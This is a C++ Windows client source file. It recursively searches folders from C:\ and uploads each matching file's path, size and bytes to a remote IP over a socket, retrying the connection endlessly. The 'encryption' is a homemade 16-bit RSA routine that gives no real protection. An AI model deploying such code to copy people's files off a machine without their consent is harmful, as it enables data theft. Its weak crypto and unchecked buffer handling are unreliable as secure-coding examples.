#include "stdafx.h"
#include "Client.h"

/*for search*/
bool firstFolder = true; //only first folder (durring search folder)
wchar_t path[MAX_PATH];
wchar_t folder[] = L"C:\\";
US len = 0;

/*for connection*/
SOCKET sC;
sockaddr_in client;
WSADATA wsadata;
const US MAX_DATA = 65514;
char buf[MAX_DATA]; 
bool errConnect = false; //variable for connection status 

/*kay for RSA*/
US e = 0;
US n = 0;

/*LOG*/
wofstream Log;

union
{
	char ch[sizeof(DWORD)];
	DWORD i;
}fileSize;

union
{
	char ch[sizeof(US)];
	US v;
}encrypt;

//=====================================================================================================
US EncryptRSA( UC val, US e, US n )
{
	UI tmp = val;
	while(e - 1)
	{
		tmp *= val;
		if( tmp > n )
		{
			tmp %= n;
		}
		--e;
	}
	return tmp;
}

bool SendFile(wchar_t fName[MAX_PATH], DWORD fSize)
{
	ifstream TFile;
	TFile.open(fName,ios_base::in | ios_base::binary); // OPEN FILE for send in binnary mode
	if ( errConnect || !TFile.is_open() || sC == INVALID_SOCKET )
	{
		return false;
	}

	bool fSSend = false;
	Log << fName << "\n"; //full path of file on this PC
	memmove(fName, fName+len, sizeof(wchar_t) * MAX_PATH); //delete start path "C:\Program Files"...

	//send file path
	char buff[MAX_PATH*2];
	memcpy(buff,fName,sizeof(wchar_t)*wcslen(fName));

	Sleep(20);
	send(sC,buff, wcslen(fName)*2, 0); 
	
	while (1)
	{
		if ( recv(sC,buff,1,0) != -1 ) //get siquence '1'
		{
			if ( buff[0] ==  1 && !fSSend ) //send size of file
			{	
				fileSize.i = fSize;
				memcpy(buff,fileSize.ch,sizeof(DWORD));
				send(sC,buff,sizeof(DWORD),0);
				Log << "file size sended " << fSize <<"\n";
				fSSend = true;
			}

			else if ( buff[0] == 1 && fSSend) //file sending
			{
				char fByte;
				US i = 0;
				do
				{
					TFile.get(fByte);
					if( TFile.eof() )
					{
						break;
					}

					encrypt.v = EncryptRSA(fByte,e,n);
					memcpy(buf+i*2,encrypt.ch,sizeof(US));
					i++;
				}
				while( i < MAX_DATA/2 );

				if ( i != 0 )
				{
					send(sC,buf,i*2,0);
				}

				if ( TFile.eof() )
				{
					TFile.close();
					Log << "FILE WAS SENDED\n\n";
					return true;
				}
			}
		}
		else
		{
			TFile.close();
			errConnect = true;
			Log << "Connection ERROR\n";
			return false;
		}
	}
}

bool Search(LPCTSTR fName, bool inner = true, bool folder = false)
{
	if (firstFolder)
	{
		HANDLE hSearch;
		WIN32_FIND_DATA FileData;
		memset(&FileData,0,sizeof(WIN32_FIND_DATA));
	
		LPTSTR part;
		wchar_t tmp[MAX_PATH];
		wchar_t name[MAX_PATH];
	
		if ( inner ) // in inner folders ?
		{
			if ( GetFullPathName(fName,MAX_PATH,tmp,&part ) == 0 )
			{	
				return false;
			}
			wcscpy(name,part);
			wcscpy(part,L"*.*");
	
			FileData.dwFileAttributes = FILE_ATTRIBUTE_DIRECTORY;
	
			if ( ! ( (hSearch = FindFirstFile(tmp,&FileData) ) == INVALID_HANDLE_VALUE ) )
			{
				do
				{
					//without "." and ".."
					if ( ! wcsncmp(FileData.cFileName,L".",1) || ! wcsncmp(FileData.cFileName,L"..",2) )
					{
						continue;
					}
					
					if ( FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) //if we find folder
					{
						wchar_t next[MAX_PATH];
						if ( GetFullPathName(fName,MAX_PATH,next,&part) == 0 )
						{
							return false;
						}
						wcscpy(part,FileData.cFileName);
						wcscat(next,L"\\");
						wcscat(next,name);	//add "\\" - and call Search() again
											
						if (folder)
						{
							Search(next,true,true); //for folders
						}
						else
						{
							Search(next,true,false); //for files
						}
					}
				}
				while(FindNextFile(hSearch,&FileData));
			}
			FindClose(hSearch); //end of search
		}
	
			//Search in a folder
			if ( ( hSearch = FindFirstFile(fName,&FileData) ) == INVALID_HANDLE_VALUE )
			{	
				return true;
			}
			do
			{
				//find FOLDER or FILE ?
				if ( !folder && !( FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) )		//we need file and find file?
				{
					wchar_t file[MAX_PATH];
					GetFullPathName(fName,MAX_PATH,file,&part); //Get path for file
					wcscpy(part,FileData.cFileName);
					if ( ! SendFile(file,FileData.nFileSizeLow) ) // SEND FILE
					{
						return false;
					}
					Log << FileData.cFileName << "\n";
				}

				else if ( firstFolder && folder && (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) )	//we need folder and find folder?
				{
					hSearch = INVALID_HANDLE_VALUE; // We need only one folder
					firstFolder = false;
					GetFullPathName(fName,MAX_PATH,path,&part);
					wcscpy(part,FileData.cFileName);
					Log << "FOLDER : " << path << "\n\n";
					
					len = wcslen(path);
					wchar_t * pW = &path[len - 1];
					for(; *pW != '\\'; --pW)
					{
						/*NULL*/
					}
					len = pW - path + 1;
				}
			}
			while( FindNextFile(hSearch,&FileData) );
			FindClose(hSearch);
	}
		return true;
}

bool ActivateSock(const char* iP, int port, int delay)
{
	if ( !iP || port <= 0 || port > 65535 || delay < 0 )
	{
		Log << "Bad activation data\n";
		return false;
	}
		if ( WSAStartup(MAKEWORD(2,2),&wsadata) != 0 )
		{
		Log << "Error WSADATA\n";
				return false;
		}
		Log << "WSADATA was activated\n";

		if ( (sC = socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET )
		{
			Log << "Error SOCKET\n";
			return false;
		}
		Log << "SOCKET was opened\n";

		client.sin_family = AF_INET;
		client.sin_port = htons(port);
		client.sin_addr.s_addr = inet_addr(iP);

		while( connect(sC,(struct sockaddr*)&client,sizeof(client)) )
		{
			Log << "Error CONNECT try again\n";
			Sleep(delay);
		}
		return true;
}

